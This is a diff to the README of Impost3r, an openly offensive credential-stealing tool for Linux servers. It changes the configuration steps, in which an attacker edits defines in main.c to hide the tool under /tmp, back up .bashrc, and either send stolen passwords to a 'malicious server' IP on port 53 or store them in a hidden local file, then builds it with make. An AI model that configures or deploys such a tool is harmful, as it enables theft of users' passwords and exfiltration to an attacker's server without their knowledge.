@@ -43,15 +43,27 @@ fi
 
 - Then,save it and run ```source ~/.bashrc```
 
-- After that,attacker needs to edit the source code of Impost3r:
+- After that,attacker needs to edit the source code of Impost3r(main.c):
 
 ```
-# define MAX_RESEND 30  \\Set the maximum times that Impost3r will try to resends stealing result to attacker's server
-# define RESEND_INTERVAL 5  \\Set the interval of resending stealing result.
-# define FILENAME "/tmp/.impost3r"  \\Set the location where the Impost3r is on the server you attack.
+/*
+    Custom setting
+*/
+# define FILENAME "/tmp/.impost3r" \\Set the location where the Impost3r is on the server you attack.
 # define BACKUP_BASHRC "/tmp/.bashrc" \\Set the location where the backup .bashrc is on the server you attack.
+# define SAVE_OR_SEND 0 \\Set the method you want to apply when Impost3r get the password,(send to your server=0,save the result on the current server=1,default is send)
+/*
+    Send to server
+*/
+# define MAX_RESEND 30 \\Set the maximum times that Impost3r will try to resends stealing result to attacker's server
+# define RESEND_INTERVAL 5 \\Set the interval of resending stealing result.
 # define REMOTE_ADDRESS "192.168.0.12" \\Set the malicious server ip address that you want to receive stealing result
 # define REMOTE_PORT 53 \\Set the malicious server port
+
+/*
+    Save to local
+*/
+# define SAVE_LOCATION "/tmp/.cache" \\Set the result file location if you want to save the result on the server(SAVE_OR_SEND = 1)
 ```
 - Save the source code,and run ```make``` 
 
